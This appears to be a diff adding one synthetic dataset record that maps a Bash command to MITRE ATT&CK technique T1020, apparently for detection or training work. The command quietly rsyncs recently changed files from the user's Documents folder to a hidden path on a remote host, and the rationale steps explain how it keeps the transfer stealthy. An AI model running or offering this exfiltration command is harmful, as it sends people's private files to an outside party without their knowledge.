@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --files-from=<(find $HOME/Documents -type f -mtime -1 -size -10M -printf '%P\\n') $HOME/Documents/ backup@cdn.example.net:.cache/.recent/$HOSTNAME/",
+  "explanation": "Builds a dynamic file list of recently modified, small documents and exfiltrates them in a single quiet rsync session, demonstrating automated, selective exfiltration (T1020).",
+  "rationale_steps": [
+    "Enumerate target files (recent and small) to limit scope.",
+    "Feed the list directly to rsync to avoid multiple sessions.",
+    "Compress and quietly transfer to a hidden remote location.",
+    "Reduces redundancy by focusing on recent changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-f7d3cd76",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
